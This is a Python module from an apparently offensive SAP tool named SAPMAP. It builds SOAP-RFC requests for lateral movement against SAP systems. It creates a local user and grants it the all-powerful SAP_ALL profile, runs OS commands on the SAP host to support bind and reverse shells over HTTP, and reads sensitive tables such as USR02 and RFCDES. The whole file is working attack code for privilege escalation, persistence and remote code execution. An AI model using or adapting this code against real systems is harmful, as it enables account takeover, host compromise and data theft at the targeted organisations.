"""SOAP envelope builders + response parser for SAP SOAP-RFC.

SAP exposes every RFC-enabled function module at /sap/bc/soap/rfc as a SOAP
operation in the urn:sap-com:document:sap:rfc:functions namespace.  This
module produces the request envelopes we need for the Phase 3a lateral-
movement primitives:

    RFC_PING                       — connectivity / credential check
    BAPI_USER_CREATE1              — create the local user
    BAPI_USER_PROFILES_ASSIGN      — grant SAP_ALL
    BAPI_TRANSACTION_COMMIT        — persist (BAPIs do not auto-commit)

The parser handles three response shapes:
 1. Success: <FM_NAME>.Response with OUT params, structures and tables.
 2. BAPI logical error: success-looking response, but RETURN table has
    rows with TYPE='E'/'A'/'X' — we surface those in `error`.
 3. SOAP fault: the SAP kernel returns an HTTP 500 with a SOAP fault for
    SYSTEM_FAILURE, RFC_AUTHORIZATION_FAILURE etc.

Kept dependency-free (stdlib ElementTree + xml.sax.saxutils.escape) so
the rest of SAPMAP doesn't need a SOAP library just to call four FMs.
"""
from __future__ import annotations

from xml.etree import ElementTree as ET
from xml.sax.saxutils import escape as _xml_escape

_NS_RFC = "urn:sap-com:document:sap:rfc:functions"
_NS_SOAP = "http://schemas.xmlsoap.org/soap/envelope/"

# Strictest XML escaping: also encode " and '.  Passwords routinely
# contain quotes; left unescaped they don't break ABAP, but make the
# resulting envelope fragile to copy/paste debugging and (in some
# kernels) interact badly with attribute-style parsing.
_XML_ENTITIES = {'"': '&quot;', "'": '&apos;'}


def escape(s: str) -> str:
    return _xml_escape(s, _XML_ENTITIES)


def _wrap_envelope(body_xml: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<soapenv:Envelope '
        f'xmlns:soapenv="{_NS_SOAP}" '
        f'xmlns:urn="{_NS_RFC}">'
        '<soapenv:Header/>'
        f'<soapenv:Body>{body_xml}</soapenv:Body>'
        '</soapenv:Envelope>'
    )


# ---------------------------------------------------------------------------
# Builders
# ---------------------------------------------------------------------------

def build_rfc_ping() -> str:
    """RFC_PING has no parameters; a successful response means the
    credentials passed authentication and the function group is callable."""
    return _wrap_envelope("<urn:RFC_PING/>")


def build_bapi_user_create1(username: str, password: str,
                            firstname: str = "SAPMAP",
                            lastname: str = "Tool",
                            user_type: str = "A") -> str:
    """BAPI_USER_CREATE1 — create a user with a logon password.

    USTYP='A' (dialog) so the user can be used for interactive RFC.
    Caller is expected to also call BAPI_USER_PROFILES_ASSIGN and
    BAPI_TRANSACTION_COMMIT — none of which auto-commit.
    """
    body = (
        '<urn:BAPI_USER_CREATE1>'
        f'<USERNAME>{escape(username)}</USERNAME>'
        '<PASSWORD>'
        f'<BAPIPWD>{escape(password)}</BAPIPWD>'
        '</PASSWORD>'
        '<ADDRESS>'
        f'<FIRSTNAME>{escape(firstname)}</FIRSTNAME>'
        f'<LASTNAME>{escape(lastname)}</LASTNAME>'
        '</ADDRESS>'
        '<LOGONDATA>'
        f'<USTYP>{escape(user_type)}</USTYP>'
        '</LOGONDATA>'
        '</urn:BAPI_USER_CREATE1>'
    )
    return _wrap_envelope(body)


def build_bapi_user_profiles_assign(username: str,
                                    profiles: list) -> str:
    """BAPI_USER_PROFILES_ASSIGN — overwrite the profile list.

    Note: this REPLACES the user's profile assignment.  Pass ['SAP_ALL']
    for the SAPMAP elevation path; pre-existing profiles on the user
    will be removed.  For new users (just created) that's the desired
    behaviour.
    """
    items = "".join(
        f'<item><BAPIPROF>{escape(p)}</BAPIPROF></item>'
        for p in profiles
    )
    body = (
        '<urn:BAPI_USER_PROFILES_ASSIGN>'
        f'<USERNAME>{escape(username)}</USERNAME>'
        f'<PROFILES>{items}</PROFILES>'
        '</urn:BAPI_USER_PROFILES_ASSIGN>'
    )
    return _wrap_envelope(body)


def build_bapi_user_get_detail(username: str) -> str:
    """BAPI_USER_GET_DETAIL — read a user's profiles + roles.

    IMPORTING: USERNAME + CACHE_RESULTS.
    TABLES (returned): PROFILES, ACTIVITYGROUPS, RETURN.

    Critical detail: SAP's SOAP-RFC kernel only emits TABLES in the
    response when the request DECLARES them (even empty).  Without the
    <PROFILES/>, <ACTIVITYGROUPS/>, <RETURN/> placeholders below, the
    BAPI runs and populates them server-side but the SOAP serializer
    strips them on the way out — leaving us blind to SAP_ALL.

    Verified empirically against kernel 742: with placeholders the
    response carries the SAP_ALL row; without them the response is
    EXPORTING-only.  Same kernel quirk applies to most BAPIs with
    output tables.

    Requires S_USER_GRP read auth on the caller — almost always true
    for the SecStore-decrypted RFC user, but on the rare failure the
    BAPI returns RFC_AUTHORIZATION_FAILURE and the click-time check
    path still applies.
    """
    body = (
        '<urn:BAPI_USER_GET_DETAIL>'
        f'<USERNAME>{escape(username)}</USERNAME>'
        '<CACHE_RESULTS>X</CACHE_RESULTS>'
        '<PROFILES/>'
        '<ACTIVITYGROUPS/>'
        '<RETURN/>'
        '</urn:BAPI_USER_GET_DETAIL>'
    )
    return _wrap_envelope(body)


def build_sxpg_step_xpg_start(command: str, params: str = "",
                              destination: str = "",
                              long_params: str = "",
                              mxrow: int = 9999) -> str:
    """SXPG_STEP_XPG_START — execute an OS command on the SAP host.

    Same FM SAPMAP already uses via pyrfc (sapmap_rfc.execute_remote_
    command / execute_local_command); this builder produces the SOAP
    envelope so the OS Terminal, bind shell, and reverse shell can
    work over HTTP when the gateway port is firewalled.

    Caller-supplied parameters mirror the pyrfc kwargs verbatim:
      EXTPROG       — the binary to run (cmd.exe, /bin/sh, python3...)
      PARAMS        — command-line args, capped at CHAR255 by ABAP
      LONG_PARAMS   — args longer than 255 chars (kernel ≥ 711 only)
      DESTINATION   — TCP/IP destination name (empty = local exec)
      MXROW         — max LOG rows requested (older kernels raise
                       RFC_INVALID_PARAMETER if present — handled by
                       the session method's fallback retry)

    All other SAP-defined fields use the same defaults as pyrfc:
    STDINCNTL=R (read), STDOUT/ERRCNTL=M (merge), TRACECNTL=0,
    TRACELEVEL=0, TERMCNTL=C (close), CONNCNTL=H (half-duplex).
    """
    body = (
        '<urn:SXPG_STEP_XPG_START>'
        f'<TARGET></TARGET>'
        f'<DESTINATION>{escape(destination)}</DESTINATION>'
        f'<EXTPROG>{escape(command)}</EXTPROG>'
        f'<PARAMS>{escape(params)}</PARAMS>'
        '<STDINCNTL>R</STDINCNTL>'
        '<STDOUTCNTL>M</STDOUTCNTL>'
        '<STDERRCNTL>M</STDERRCNTL>'
        '<TRACECNTL>0</TRACECNTL>'
        '<TERMCNTL>C</TERMCNTL>'
        '<TRACELEVEL>0</TRACELEVEL>'
        f'<LONG_PARAMS>{escape(long_params)}</LONG_PARAMS>'
        '<CONNCNTL>H</CONNCNTL>'
        f'<MXROW>{int(mxrow)}</MXROW>'
        # Output table placeholders — SAP's SOAP kernel only emits
        # tables it sees declared in the request (same quirk as
        # BAPI_USER_GET_DETAIL.PROFILES).
        '<LOG/>'
        '</urn:SXPG_STEP_XPG_START>'
    )
    return _wrap_envelope(body)


def build_sxpg_step_xpg_start_no_mxrow(command: str, params: str = "",
                                       destination: str = "",
                                       long_params: str = "") -> str:
    """Variant without MXROW for older kernels that reject the field.

    Mirrors the fallback retry in sapmap_rfc.execute_remote_command —
    kernels around 7.0x raise RFC_INVALID_PARAMETER if MXROW is
    present; default is 2 rows there, which is awful but the
    alternative is the call failing outright.
    """
    body = (
        '<urn:SXPG_STEP_XPG_START>'
        f'<TARGET></TARGET>'
        f'<DESTINATION>{escape(destination)}</DESTINATION>'
        f'<EXTPROG>{escape(command)}</EXTPROG>'
        f'<PARAMS>{escape(params)}</PARAMS>'
        '<STDINCNTL>R</STDINCNTL>'
        '<STDOUTCNTL>M</STDOUTCNTL>'
        '<STDERRCNTL>M</STDERRCNTL>'
        '<TRACECNTL>0</TRACECNTL>'
        '<TERMCNTL>C</TERMCNTL>'
        '<TRACELEVEL>0</TRACELEVEL>'
        f'<LONG_PARAMS>{escape(long_params)}</LONG_PARAMS>'
        '<CONNCNTL>H</CONNCNTL>'
        '<LOG/>'
        '</urn:SXPG_STEP_XPG_START>'
    )
    return _wrap_envelope(body)


def build_rfc_read_table(table: str, fields: list = None,
                         where: list = None,
                         delimiter: str = "|",
                         no_data: bool = False,
                         rowcount: int = 0,
                         rowskips: int = 0) -> str:
    """RFC_READ_TABLE — generic table read.

    Same FM SAPMAP already uses via pyrfc (sapmap_rfc.get_client_roles,
    multiple other read paths).

    Args:
      table:     SAP table name (T000, USR02, RFCDES, ...)
      fields:    list of field-name strings (empty / None = all fields,
                 limited to the first ~5 by RFC interface practice)
      where:     list of WHERE-clause strings, each ≤72 chars per the
                 OPTIONS-row CHAR72 constraint.  Caller must split
                 long predicates across rows.
      delimiter: separator the SAP kernel inserts between fields in
                 the WA output row (default '|' is the SAPMAP norm)
      no_data:   when True, returns only the FIELDS metadata (used
                 by DDIF lookups)
      rowcount:  cap rows returned; 0 = no cap
      rowskips:  skip the first N rows; 0 = none
    """
    fields_xml = ""
    for f in (fields or []):
        fields_xml += (
            f'<item><FIELDNAME>{escape(str(f))}</FIELDNAME></item>')
    options_xml = ""
    for w in (where or []):
        options_xml += (
            f'<item><TEXT>{escape(str(w))}</TEXT></item>')
    body = (
        '<urn:RFC_READ_TABLE>'
        f'<QUERY_TABLE>{escape(table)}</QUERY_TABLE>'
        f'<DELIMITER>{escape(delimiter)}</DELIMITER>'
        f'<NO_DATA>{"X" if no_data else ""}</NO_DATA>'
        f'<ROWCOUNT>{int(rowcount)}</ROWCOUNT>'
        f'<ROWSKIPS>{int(rowskips)}</ROWSKIPS>'
        f'<OPTIONS>{options_xml}</OPTIONS>'
        f'<FIELDS>{fields_xml}</FIELDS>'
        '<DATA/>'
        '</urn:RFC_READ_TABLE>'
    )
    return _wrap_envelope(body)


def build_rfc_get_system_info() -> str:
    """RFC_GET_SYSTEM_INFO — authenticated system metadata.

    Same FM SAPMAP already uses for ping/discovery (no DESTINATION
    parameter = local; with DESTINATION = forwarded RFC).  When called
    over SOAP we always want local info (the target itself), so
    DESTINATION is omitted.

    Returns RFCSI_EXPORT structure with RFCDEST, RFCHOST, RFCSYSID,
    RFCDATABS, RFCDBHOST, RFCDBSYS, RFCSAPRL (release), RFCMACH,
    RFCOPSYS, RFCKERNRL (kernel), RFCIPADDR — populates the empty
    OS/Database/Kernel/SAP Release rows in System Details.
    """
    return _wrap_envelope("<urn:RFC_GET_SYSTEM_INFO/>")


def build_bapi_transaction_commit(wait: bool = True) -> str:
    """BAPI_TRANSACTION_COMMIT — flush pending updates.

    WAIT='X' makes the COMMIT WORK synchronous (V1 update finishes
    before the call returns), which we want so subsequent BAPIs see
    the user.  WAIT='' is async.
    """
    body = (
        '<urn:BAPI_TRANSACTION_COMMIT>'
        f'<WAIT>{"X" if wait else ""}</WAIT>'
        '</urn:BAPI_TRANSACTION_COMMIT>'
    )
    return _wrap_envelope(body)


# ---------------------------------------------------------------------------
# Response parser
# ---------------------------------------------------------------------------

def _localname(tag: str) -> str:
    """Strip XML namespace from a tag, returning the local element name."""
    return tag.split("}", 1)[1] if "}" in tag else tag


def parse_response(xml_str: str, fm_name: str) -> dict:
    """Parse a SOAP-RFC response into a structured dict.

    Returns:
      {
        "ok":     bool,         True when no fault and no E/A/X in RETURN
        "params": dict,         scalar OUT params + OUT structures
        "tables": dict,         OUT/CHANGING tables, each is list[dict]
        "error":  str,          empty on success, otherwise human-readable
        "raw":    str,          original response body (for debugging)
      }

    For BAPI calls the RETURN table is the canonical error channel —
    any row with TYPE='E'/'A'/'X' fails the call.  S (success) and
    W (warning) leave ok=True.
    """
    result = {
        "ok": False, "params": {}, "tables": {},
        "error": "", "raw": xml_str,
    }

    try:
        root = ET.fromstring(xml_str)
    except ET.ParseError as e:
        result["error"] = f"XML parse error: {e}"
        return result

    # SOAP fault → transport/auth error
    for elem in root.iter():
        if _localname(elem.tag) == "Fault":
            code = ""
            string = ""
            for child in elem:
                lname = _localname(child.tag)
                if lname == "faultcode":
                    code = (child.text or "").strip()
                elif lname == "faultstring":
                    string = (child.text or "").strip()
            result["error"] = (
                f"SOAP fault: {code} - {string}".strip(" -"))
            return result

    # Find the FM response element
    expected = f"{fm_name}.Response"
    response_elem = None
    for elem in root.iter():
        if _localname(elem.tag) == expected:
            response_elem = elem
            break

    if response_elem is None:
        # Some kernels return the response without the .Response suffix
        # (a SAP cloud variant).  Fall back to looking for the FM name.
        for elem in root.iter():
            if _localname(elem.tag) == fm_name:
                response_elem = elem
                break

    if response_elem is None:
        first_tags = [_localname(e.tag) for e in root.iter()][:8]
        result["error"] = (
            f"No <{expected}> in response body. "
            f"Saw: {first_tags}")
        return result

    # Walk the response element: split into params (scalars + structures)
    # and tables (anything with <item> children).
    for child in response_elem:
        tag = _localname(child.tag)
        sub_elements = list(child)
        items = [c for c in sub_elements if _localname(c.tag) == "item"]
        if items:
            rows = []
            for item in items:
                row = {}
                for field in item:
                    row[_localname(field.tag)] = (field.text or "")
                rows.append(row)
            result["tables"][tag] = rows
        elif sub_elements:
            # Structure
            struct = {}
            for field in sub_elements:
                struct[_localname(field.tag)] = (field.text or "")
            result["params"][tag] = struct
        else:
            result["params"][tag] = (child.text or "")

    # BAPI RETURN table inspection.  RETURN may also appear as a single
    # structure (not wrapped in <item>) when the kernel uses the "BAPIRET2
    # structure" form — handle both.
    return_rows = result["tables"].get("RETURN", [])
    if not return_rows and isinstance(
            result["params"].get("RETURN"), dict):
        return_rows = [result["params"]["RETURN"]]

    bapi_errors = []
    for row in return_rows:
        if row.get("TYPE", "") in ("E", "A", "X"):
            bapi_errors.append(
                f"{row.get('TYPE')} "
                f"{row.get('ID', '')}"
                f"{row.get('NUMBER', '')}: "
                f"{row.get('MESSAGE', '').strip()}"
            )

    if bapi_errors:
        result["error"] = "; ".join(bapi_errors)
        result["ok"] = False
    else:
        result["ok"] = True

    return result
